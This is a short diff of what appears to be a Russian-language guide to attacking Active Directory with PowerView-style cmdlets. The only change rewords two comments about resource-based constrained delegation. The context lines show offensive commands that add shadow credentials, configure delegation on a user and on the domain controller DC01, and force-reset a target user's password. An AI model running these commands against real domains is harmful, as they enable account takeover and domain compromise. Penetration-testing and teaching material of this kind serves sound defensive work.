@@ -148,7 +148,7 @@ Set-DomainUser -Identity "targetuser" -AddShadowCredential
 
 # RBCD: настроить делегирование
 Set-DomainUser -Identity "targetuser" -AddRBCD "YOURCOMPUTER$"
-# YOURCOMPUTER$ теперь может выдавать пользователей за себя при доступе к targetuser!
+# YOURCOMPUTER$ теперь может выступать от имени пользователей при обращении к targetuser!
 
 # Принудительно сбросить пароль (нужно право ResetPassword)
 Set-DomainUser -Identity "targetuser" -NewPassword "NewP@ssw0rd!"
@@ -248,7 +248,7 @@ Set-DomainComputer
 ```powershell
 # RBCD: настроить делегирование на контроллер домена
 Set-DomainComputer -Identity "DC01" -AddRBCD "YOURCOMPUTER$"
-# YOURCOMPUTER$ теперь может выдавать себя за пользователей перед DC01!
+# YOURCOMPUTER$ теперь может выступать от имени пользователей при обращении к DC01!
 
 # Shadow Credentials на компьютере
 Set-DomainComputer -Identity "FILESERVER01" -AddShadowCredential
